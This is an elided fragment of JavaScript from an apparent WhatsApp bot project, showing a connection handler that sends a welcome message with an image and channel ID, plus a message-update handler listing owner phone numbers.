    ...
    conn.ev.on('connection.update', async (update) => {
      ...
      if (connection === 'close') {
        ...
        try {
          ...
          let up = `*Hᴇʟʟᴏ ᴛʜᴇʀᴇ ɴᴇᴛʜᴜᴡʜ-xᴍᴅ-ᴠ0.001 ᴄᴏɴɴᴇᴄᴛᴇᴅ! 👋🏻* 
...
https://github.com/nethuwh-xmd/NETHUWH-XMD-V0.001/edit/main/index.js#L38

> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɴᴇᴛʜᴜᴡʜ 🫆🎭`;
    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/fge8q7.jpg` }, caption: up })

          const channelJid = "120363400371703970@newsletter"
          try {
...
conn?.ev?.on('messages.update', async updates => {
  ...
  const udp = botNumber.split('@')[0];
    const nethuwh = ('94740021158', '263714757857', '263780934873');
